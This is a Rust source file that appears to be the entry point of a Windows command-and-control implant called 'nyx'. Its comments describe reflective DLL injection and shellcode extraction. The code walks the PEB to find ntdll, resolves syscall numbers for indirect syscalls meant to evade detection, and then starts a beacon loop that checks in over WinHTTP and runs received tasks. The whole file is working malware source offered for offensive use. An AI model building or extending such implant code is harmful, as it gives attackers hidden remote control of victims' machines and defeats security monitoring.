//! PIC entry point + task loop bootstrap.
//!
//! For a `cdylib`/shellcode implant the "entry" is an exported function the
//! loader calls (reflective DLL injection) or a thread the host spins up. It:
//!   1. locates ntdll + resolves the API set it needs (no allocation yet),
//!   2. the global allocator self-bootstraps on first `alloc`,
//!   3. runs the beacon loop: check-in → receive tasks → execute → repeat.
//!
//! All Windows-only. On the dev host this module is excluded by cfg.
//!
//! The real PIC extraction (Stardust-style sRDI) turns the cdylib into raw
//! position-independent shellcode whose first byte is the entry below. Until
//! that extraction step exists, the function is the reflective entry a
//! host-side loader calls after mapping the DLL.

#![cfg(target_os = "windows")]

use crate::resolve::LiveNtdll;

/// The reflective/PIC entry. Resolves ntdll, builds the SSN table, primes the
/// indirect-syscall runtime, then enters the beacon loop.
///
/// Marked `#[no_mangle]` so it survives `opt-level="z"` and is the address sRDI
/// extraction marks as the entry point.
#[no_mangle]
pub unsafe extern "system" fn nyx_entry() {
    // 1. PEB-walk ntdll + resolve the SSN table (validates resolve.rs).
    let Some(ntdll) = LiveNtdll::locate() else {
        core::hint::spin_loop();
        return;
    };
    let _ssn_table = ntdll.resolve_table_owned();

    // 2. Indirect-syscall runtime: scan for the ntdll gadget + resolve SSNs.
    //    This is what turns nyx_evasion from an algorithm into a live runtime.
    let _syscall_rt = crate::syscalls::Runtime::init();

    // 3. Enter the beacon loop (WinHTTP check-in + task loop).
    crate::core::beacon_loop();
}
